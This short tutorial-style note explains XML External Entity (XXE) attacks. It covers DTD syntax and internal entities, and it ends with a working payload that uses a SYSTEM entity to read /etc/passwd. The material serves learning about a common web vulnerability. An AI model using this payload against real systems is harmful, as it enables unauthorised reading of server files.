# XXE

XML External Entity

## DTD

DTD Stands for Document Type Definition

```xml
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

- `#PCDATA` means parseable character data.
- `!DOCTYPE note` - Defines a root element of the document named note
- `!ELEMENT note` - Defines that the note element must contain the elements: "to, from, heading, body"
- `!ELEMENT to` - Defines the to element to be of type "#PCDATA"
- `!ELEMENT from` - Defines the from element to be of type "#PCDATA"
- `!ELEMENT heading` - Defines the heading element to be of type "#PCDATA"
- `!ELEMENT body` - Defines the body element to be of type "#PCDATA"

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
```

Here, `&name` gets replaced by `"feast"`

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```

Here `&read` gets replaced by the specified file. Here the `SYSTEM` option is important.
